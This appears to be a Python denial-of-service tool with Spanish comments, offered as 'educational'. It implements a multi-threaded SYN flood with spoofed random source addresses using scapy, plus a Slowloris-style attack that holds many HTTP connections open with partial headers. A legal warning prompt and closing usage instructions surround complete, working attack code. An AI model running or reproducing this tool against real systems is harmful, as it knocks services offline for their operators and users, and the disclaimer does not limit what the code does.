#!/usr/bin/env python3
"""
⚠️ EDUCATIONAL PURPOSES ONLY - SYN Flood Tool
Solo para pruebas en redes autorizadas (lab propio)
"""
import sys
import time
import random
from threading import Thread

try:
    from scapy.all import IP, TCP, send, RandIP, RandShort
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

class SYNFlood:
    def __init__(self, target_ip, target_port=80):
        self.target_ip = target_ip
        self.target_port = target_port
        self.running = False
        self.packets_sent = 0
        
    def show_warning(self):
        """Muestra advertencia legal"""
        print("\n" + "="*60)
        print("⚠️  ADVERTENCIA LEGAL  ⚠️")
        print("="*60)
        print("Esta herramienta es SOLO para:")
        print("  • Pruebas en redes propias")
        print("  • Laboratorios autorizados")
        print("  • Fines educativos")
        print("\n🚫 El uso no autorizado es ILEGAL")
        print("🚫 Puede violar leyes como:")
        print("  • Computer Fraud and Abuse Act (USA)")
        print("  • Ley de Delitos Informáticos (México)")
        print("="*60)
        
        response = input("\n¿Aceptas los términos y tienes autorización? (yes/no): ")
        if response.lower() != "yes":
            print("❌ Abortando...")
            sys.exit(0)
        print("✅ Continuando bajo tu responsabilidad\n")
    
    def send_syn(self):
        """Envía un solo paquete SYN"""
        if not SCAPY_AVAILABLE:
            return
        
        ip = IP(src=RandIP(), dst=self.target_ip)
        tcp = TCP(sport=RandShort(), dport=self.target_port, flags="S", seq=random.randint(1000, 9000))
        packet = ip / tcp
        send(packet, verbose=False)
        self.packets_sent += 1
    
    def flood(self, duration=10, threads=50):
        """Ejecuta SYN flood multi-thread"""
        self.show_warning()
        
        if not SCAPY_AVAILABLE:
            print("❌ Scapy necesario. pip install scapy")
            return
        
        self.running = True
        print(f"🎯 Target: {self.target_ip}:{self.target_port}")
        print(f"⏱️  Duración: {duration} segundos")
        print(f"🧵 Threads: {threads}")
        print(f"🔥 Iniciando SYN flood...\n")
        
        start_time = time.time()
        
        def worker():
            while self.running and (time.time() - start_time) < duration:
                self.send_syn()
                time.sleep(0.001)  # Pequeña pausa
        
        # Lanzar threads
        threads_list = []
        for _ in range(threads):
            t = Thread(target=worker)
            t.start()
            threads_list.append(t)
        
        # Monitorear
        try:
            while time.time() - start_time < duration:
                time.sleep(1)
                print(f"📊 Paquetes enviados: {self.packets_sent} | "
                      f"Tasa: {self.packets_sent / (time.time() - start_time):.0f} pkt/s", end='\r')
        except KeyboardInterrupt:
            print("\n⏹️ Detenido por usuario")
        
        self.running = False
        
        # Esperar threads
        for t in threads_list:
            t.join()
        
        elapsed = time.time() - start_time
        print(f"\n\n✅ Flood completado")
        print(f"📦 Total paquetes: {self.packets_sent}")
        print(f"⚡ Promedio: {self.packets_sent/elapsed:.0f} pkt/s")
    
    def slow_dos(self, target_url, connections=200):
        """Slowloris-style DoS educativo"""
        import socket
        
        print(f"\n🐌 Iniciando Slow DoS contra {target_url}")
        print(f"🔌 Conexiones lentas: {connections}")
        
        sockets = []
        for i in range(connections):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((target_url, 80))
                sock.send(b"GET / HTTP/1.1\r\n")
                sockets.append(sock)
                print(f"✅ Conexión {i+1} establecida", end='\r')
            except:
                pass
        
        print(f"\n\n📡 Manteniendo {len(sockets)} conexiones abiertas...")
        try:
            while True:
                for sock in sockets:
                    try:
                        sock.send(b"X-Header: a\r\n")
                    except:
                        sockets.remove(sock)
                time.sleep(10)
                print(f"🔄 Conexiones activas: {len(sockets)}", end='\r')
        except KeyboardInterrupt:
            print("\n\n⏹️ Cerrando conexiones...")
            for sock in sockets:
                sock.close()

def test():
    print("[TEST] DoS module loaded")

if __name__ == "__main__":
    print("⚠️ Módulo educativo de DoS")
    print("="*40)
    
    # Uso educativo
    flooder = SYNFlood("192.168.1.100", 8080)  # Cambiar por IP de LAB
    # flooder.flood(duration=5, threads=20)  # Descomentar para LAB
    
    print("\n💡 Para usar:")
    print("  flooder = SYNFlood('IP_OBJETIVO', puerto)")
    print("  flooder.flood(duration=10, threads=50)")
